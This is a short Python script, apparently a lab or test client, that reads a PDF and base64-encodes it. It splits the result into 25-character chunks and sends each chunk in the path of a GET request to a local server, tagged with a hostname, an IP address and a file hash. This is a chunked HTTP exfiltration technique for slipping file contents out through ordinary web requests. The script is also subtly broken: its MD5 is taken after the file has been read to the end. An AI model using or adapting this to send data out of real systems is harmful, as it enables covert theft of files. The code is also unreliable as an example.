import hashlib
import base64
import requests

HOSTNAME="USER-PC"
IP="192.168.1.1"
DATATYPE="PDF"
BASE_URL = "http://127.0.0.1:8000/f/"
FILE='sample.pdf'

with open(FILE, 'rb') as afile:
    base64=base64.b64encode(afile.read()).decode()
    hash_file=hashlib.md5(afile.read()).hexdigest()

    file_parts=[base64[i: i + 25] for i in range(0, len(base64), 25)]

    for file_part in file_parts:
        url=BASE_URL+HOSTNAME+"/"+IP+"/"+DATATYPE+"/"+hash_file+"/"+file_part
        requests.get(url)
